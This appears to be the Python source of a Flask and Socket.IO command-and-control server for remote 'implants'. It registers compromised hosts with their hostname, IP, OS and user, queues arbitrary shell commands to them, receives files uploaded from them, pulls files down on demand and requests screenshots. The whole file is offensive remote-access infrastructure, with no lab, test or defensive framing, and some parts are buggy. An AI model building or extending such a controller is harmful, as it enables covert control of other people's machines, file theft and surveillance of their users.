from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
from flask_socketio import SocketIO, emit
import os
import json
import time
from datetime import datetime
import sqlite3
from werkzeug.utils import secure_filename
import threading
import queue
import logging
from config import Config

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config.from_object(Config)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['UPLOAD_FOLDER'] = 'uploads'
socketio = SocketIO(app, cors_allowed_origins="*")

# Global variables
active_implants = {}
command_queues = {}
results = {}

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

def init_db():
    """Initialize the SQLite database"""
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS implants
                 (id TEXT PRIMARY KEY, hostname TEXT, ip TEXT, 
                  os TEXT, user TEXT, check_in TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  implant_id TEXT, command TEXT, 
                  status TEXT, result TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

def get_db():
    """Get database connection"""
    conn = sqlite3.connect('c2.db')
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    """Render the main dashboard"""
    return render_template('index.html', implants=active_implants)

@app.route('/api/implants')
def get_implants():
    """Get list of all implants"""
    conn = get_db()
    implants = conn.execute('SELECT * FROM implants').fetchall()
    conn.close()
    return jsonify([dict(implant) for implant in implants])

@app.route('/api/implants/<implant_id>/command', methods=['POST'])
def send_command(implant_id):
    """Send a command to an implant"""
    if implant_id not in command_queues:
        return jsonify({'error': 'Implant not found'}), 404
    
    command = request.json.get('command')
    if not command:
        return jsonify({'error': 'No command provided'}), 400
    
    # Store command in database
    conn = get_db()
    conn.execute('INSERT INTO commands (implant_id, command, status, timestamp) VALUES (?, ?, ?, ?)',
                (implant_id, command, 'pending', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # Add command to queue
    command_queues[implant_id].put(command)
    return jsonify({'status': 'Command queued'})

@app.route('/api/implants/<implant_id>/upload', methods=['POST'])
def upload_file(implant_id):
    """Handle file uploads from implants"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    if file:
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Update implant's last activity
        if implant_id in active_implants:
            active_implants[implant_id]['last_seen'] = datetime.now().isoformat()
            active_implants[implant_id]['last_activity'] = f"Uploaded file: {filename}"
        
        return jsonify({'message': 'File uploaded successfully'}), 200

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    """Serve uploaded files"""
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/api/implants/<implant_id>/download/<path:filename>')
def download_file(implant_id, filename):
    """Download a file from an implant"""
    # Queue file download command
    command = f'download {filename}'
    command_queues[implant_id].put(command)
    
    # Wait for file to be available
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    timeout = time.time() + 30  # 30 second timeout
    
    while not os.path.exists(filepath) and time.time() < timeout:
        time.sleep(0.1)
    
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/implants/<implant_id>/screenshot', methods=['POST'])
def take_screenshot(implant_id):
    """Request a screenshot from an implant"""
    command = 'screenshot'
    command_queues[implant_id].put(command)
    return jsonify({'status': 'Screenshot request queued'})

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    logger.info(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    logger.info(f"Client disconnected: {request.sid}")

@socketio.on('register')
def handle_register(data):
    """Handle implant registration"""
    implant_id = data.get('id')
    if implant_id:
        # Store implant information
        conn = get_db()
        conn.execute('''INSERT OR REPLACE INTO implants 
                        (id, hostname, ip, os, user, check_in)
                        VALUES (?, ?, ?, ?, ?, ?)''',
                    (implant_id, data.get('hostname'), data.get('ip'),
                     data.get('os'), data.get('user'),
                     datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        # Initialize command queue for this implant
        command_queues[implant_id] = queue.Queue()
        active_implants[implant_id] = {
            'last_seen': time.time(),
            'status': 'active',
            'last_activity': 'Connected'
        }
        
        emit('implants_update', active_implants, broadcast=True)
        emit('registered', {'status': 'success'})

@socketio.on('command_result')
def handle_command_result(data):
    """Handle command execution results from implants"""
    implant_id = data.get('implant_id')
    command = data.get('command')
    result = data.get('result')
    timestamp = data.get('timestamp')
    
    if implant_id and command:
        # Parse result if it's JSON (for screenshots)
        try:
            if isinstance(result, str) and result.startswith('{'):
                result_data = json.loads(result)
                if result_data.get('status') == 'success' and result_data.get('filename'):
                    # Handle screenshot result
                    result = {
                        'type': 'screenshot',
                        'message': result_data['message'],
                        'filename': result_data['filename'],
                        'timestamp': timestamp
                    }
                else:
                    result = {
                        'type': 'error',
                        'message': result_data.get('message', 'Unknown error'),
                        'timestamp': timestamp
                    }
            else:
                # Handle regular command output
                result = {
                    'type': 'command',
                    'message': result,
                    'timestamp': timestamp
                }
        except json.JSONDecodeError:
            # If result is not JSON, treat as regular command output
            result = {
                'type': 'command',
                'message': result,
                'timestamp': timestamp
            }
        
        # Store result in database
        conn = get_db()
        conn.execute('''UPDATE commands 
                        SET status = ?, result = ?
                        WHERE implant_id = ? AND command = ?''',
                    ('completed', result, implant_id, command))
        conn.commit()
        conn.close()
        
        # Update implant's last activity
        if implant_id in active_implants:
            active_implants[implant_id]['last_seen'] = timestamp
            active_implants[implant_id]['last_activity'] = f"Executed command: {command}"
        
        # Broadcast updates
        emit('implants_update', active_implants, broadcast=True)
        emit('command_result', {
            'implant_id': implant_id,
            'command': command,
            'result': result,
            'timestamp': timestamp
        }, broadcast=True)

@socketio.on('get_command_history')
def handle_get_command_history(data):
    """Send command history for an implant"""
    implant_id = data.get('implant_id')
    if implant_id in command_queues:
        command_history = []
        while not command_queues[implant_id].empty():
            command = command_queues[implant_id].get()
            command_history.append({
                'command': command,
                'timestamp': datetime.now().isoformat()
            })
        emit('command_history', {
            'implant_id': implant_id,
            'history': command_history
        })

@socketio.on('execute_command')
def handle_execute_command(data):
    """Handle command execution request"""
    implant_id = data.get('implant_id')
    command = data.get('command')
    
    if implant_id and command:
        # Broadcast command to all connected clients
        emit('command', {
            'implant_id': implant_id,
            'command': command,
            'timestamp': datetime.now().isoformat()
        }, broadcast=True)

def check_implant_health():
    """Periodically check implant health"""
    while True:
        current_time = time.time()
        for implant_id, implant in active_implants.items():
            if current_time - implant['last_seen'] > app.config['IMPLANT_CHECK_INTERVAL']:
                implant['status'] = 'disconnected'
                emit('implant_status', {
                    'implant_id': implant_id,
                    'status': 'disconnected'
                }, broadcast=True)
        time.sleep(5)

if __name__ == '__main__':
    init_db()
    # Start health check thread
    health_thread = threading.Thread(target=check_implant_health, daemon=True)
    health_thread.start()
    
    # Start the server
    if app.config['USE_SSL']:
        socketio.run(app, host=app.config['HOST'], port=app.config['PORT'],
                    ssl_context=(app.config['SSL_CERT'], app.config['SSL_KEY']))
    else:
        socketio.run(app, host=app.config['HOST'], port=app.config['PORT']) 